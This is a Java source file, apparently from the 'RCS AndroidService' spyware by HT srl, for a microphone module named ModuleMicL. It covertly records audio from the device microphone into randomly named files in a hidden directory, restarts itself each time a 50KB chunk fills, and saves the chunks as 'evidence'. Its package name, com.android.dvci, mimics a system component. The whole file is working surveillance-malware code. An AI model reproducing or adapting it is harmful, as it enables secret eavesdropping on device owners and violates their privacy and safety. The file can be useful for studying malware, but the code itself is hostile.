/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : MicAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import android.media.MediaRecorder;

import com.android.dvci.auto.Cfg;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.dvci.util.Check;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.Utils;

import java.io.FileInputStream;
import java.io.IOException;

/**
 * The Class MicAgent. 8000KHz, 16bit
 *
 * @author zeno
 * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
 */
public class ModuleMicL extends ModuleMic {

	private static final String TAG = "ModuleMicL"; //$NON-NLS-1$
	private static final long MAX_FILE_SIZE = 1024 * 50;//50KB

	private AutoFile out_file;

	public ModuleMicL() {
		super();
	}

	void specificStop() {
		stopRecorder();
		recorder = null;
	}

	void specificGo(int numFailures) {

		if (numFailures > 10) {
			stopRecorder();
			recorder = null;
			if (Cfg.DEBUG) {
				Check.log(TAG + "numFailures: " + numFailures);//$NON-NLS-1$
			}
		}
	}

	byte[] unfinished = null;

	protected byte[] getAvailable() {
		byte[] ret = null;

		if (out_file != null && out_file.exists() && out_file.getSize() != 0) {
			FileInputStream fin = null;
			try {
				// create FileInputStream object
				fin = new FileInputStream(out_file.getFile());
				ret = new byte[(int) out_file.getSize()];
				// Reads up to certain bytes of data from this input stream into an array of bytes.
				fin.read(ret);
			} catch (IOException ioe) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(getAvailable)  Exception while reading file " + ioe);
				}
			} finally {
				// close the streams using close method
				try {
					if (fin != null) {
						fin.close();
					}
				} catch (IOException ioe) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(getAvailable) Error while closing stream: " + ioe);
					}
				}
			}
		}
		Check.log(TAG + "(getAvailable) returning " + ret.length);
		return ret;
	}

	/**
	 * Start recorder.
	 *
	 * @throws IllegalStateException the illegal state exception
	 * @throws java.io.IOException   Signals that an I/O exception has occurred.
	 */
	synchronized void specificStart() throws IllegalStateException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (specificStart)");//$NON-NLS-1$
		}
		numFailures = 0;
		unfinished = null;

		if (recorder == null) {
			final DateTime dateTime = new DateTime();
			fId = dateTime.getFiledate();
			if (Cfg.DEBUG) {
				Check.log(TAG + " (specificStart) new recorder ");//$NON-NLS-1$
			}
			recorder = new MediaRecorder();
			recorder.reset();
		}
		if(recorder == null){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (specificStart) error requesting recorder ");//$NON-NLS-1$
			}
		}
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
		recorder.setOnErrorListener(this);
		recorder.setOnInfoListener(this);
		recorder.setMaxFileSize(MAX_FILE_SIZE);
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		createSockets();
		if (out_file != null) {
			recorder.setOutputFile(out_file.getFilename());
		} else {
			recorder.reset();  // You can reuse the object by going back to setAudioSource() step
			recorder.release();// Now the object cannot be reused
			recorder = null;
		}
		try {

			recorder.prepare();
			recorder.start(); // Recording is now started
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (specificStart) another apps may be blocking recording: " + e);//$NON-NLS-1$
			}
			if (recorder != null) {
				recorder.reset();  // You can reuse the object by going back to setAudioSource() step
				recorder.release();// Now the object cannot be reused
				recorder = null;
			}
			if (out_file != null) {
				deleteSockets();
			}
		}
	}

	private void createSockets() {
		if (out_file == null) {
			out_file = new AutoFile(Path.hidden(), Utils.getRandom() + ".a");
			if (Cfg.DEBUG) {
				Check.log(TAG + " (createSocket) new file: " + out_file.getFile());//$NON-NLS-1$
			}
		}
	}

	private void deleteSockets() {
		if (out_file != null && out_file.exists()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (deleteSockets) delete file: " + out_file.getFile());//$NON-NLS-1$
			}
			out_file.delete();
		}
		out_file = null;
	}

	// http://sipdroid.googlecode.com/svn/trunk/src/org/sipdroid/sipua/ui/VideoCamera.java

	/**
	 * Stop recorder.
	 */
	synchronized void stopRecorder() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopRecorder)");//$NON-NLS-1$
		}
		if (recorder != null) {
			recorder.setOnErrorListener(null);
			recorder.setOnInfoListener(null);

			try {
				recorder.stop();
				recorder.reset();  // You can reuse the object by going back to setAudioSource() step
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(ex);
				}
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence) resetting recorder");
					recorder = null;
				}
			}
			if (out_file == null || !out_file.exists()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence) Error: out_file not available");

				}
				numFailures += 1;
			} else {
				saveRecorderEvidence();
			}
		}
	}

	@Override
	void specificSuspend() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (specificSuspend): releasing recorder");
		}
		stopRecorder();
		deleteSockets();
		recorder.release();
		recorder=null;
	}

	@Override
	void specificResume() {

	}

	public void onInfo(MediaRecorder mr, int what, int extra) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onInfo): " + what);//$NON-NLS-1$
		}
		/*
		After recording reaches the specified filesize, a notification will be sent to the MediaRecorder.OnInfoListener with a "what"
		code of MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED
		and recording will be stopped.
		Stopping happens asynchronously, there is no guarantee that the recorder will
		have stopped by the time the listener is notified.
		*/
		if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onInfo): max Size reached, saving file");//$NON-NLS-1$
			}
			stopRecorder();
			deleteSockets();
			try {
				specificStart();
			} catch (Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onInfo): exception restarting Mic");//$NON-NLS-1$
				}
			}
		}
	}

	public void onError(MediaRecorder mr, int what, int extra) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onError) Error: " + what);//$NON-NLS-1$
		}
		base_suspend();
	}
	@Override
	public String getTag() {
		return TAG;
	}
}
